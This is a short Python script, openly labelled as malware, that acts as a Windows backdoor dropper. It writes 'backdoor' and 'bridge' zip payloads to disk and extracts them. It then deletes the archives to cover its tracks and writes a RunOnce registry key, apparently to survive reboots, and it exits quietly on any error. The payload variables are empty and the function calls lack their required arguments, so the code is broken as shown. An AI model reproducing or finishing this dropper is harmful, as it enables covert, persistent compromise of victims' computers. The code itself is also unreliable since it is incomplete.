#!/usr/bin/python3
#coding: utf-8
from win32 import win32api
import win32con
from os import remove
import sys
from ctypes import windll
import zipfile
import getpass

user = getpass.getuser()

class RegEdit:
    @staticmethod
    def RegEditKey():
        try:
            hkey = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, f"Software\\Microsoft\\Windows\\CurrentVersion")
            win32api.RegSetValue(hkey, "RunOnce", win32con.REG_SZ, "")
            hkey.close()
        except Exception:
            sys.exit(0)

class DecompressFiles:
    ''' Decompress backdoor on computer '''
    @staticmethod
    def DecompressBackdoor(namefile, path):
        BackdoorProgram = None
        try:
            with open(f'{path}{namefile}', 'wb') as file:
                file.write(BackdoorProgram)
                file.close()
            Zip_ref = zipfile.ZipFile(f'{path}{namefile}', 'r')
            Zip_ref.extractall(path)
            Zip_ref.close()
            return namefile, path
        except PermissionError:
            windll.user32.MessageBoxW(0, 'message here', 'title here', 64)
            sys.exit(0)
        except:
            sys.exit(0)

    @staticmethod   
    def DecompressBridge(namefile, path):
        BridgeProgram = None
        try:
            with open(f'{path}{namefile}', 'wb') as file:
                file.write(BridgeProgram)
                file.close()
            Zip_ref = zipfile.ZipFile(f'{path}{namefile}', 'r')
            Zip_ref.extractall(path)
            Zip_ref.close()
            return namefile, path
        except Exception:
            pass

    @staticmethod
    def RemoveRootFile(path, namefile):
        try:
            remove(f'{path}{namefile}')
        except Exception:
            pass
    
    @staticmethod
    def RemoveBridgeFile(path, namefile):
        try:
            remove(f'{path}{namefile}')
        except Exception:
            pass

def start():
    _namefile, _path = DecompressFiles.DecompressBackdoor()
    namefile, path = DecompressFiles.DecompressBridge()
    DecompressFiles.RemoveRootFile(_path, _namefile)
    DecompressFiles.RemoveBridgeFile(path, namefile)
    RegEdit.RegEditKey()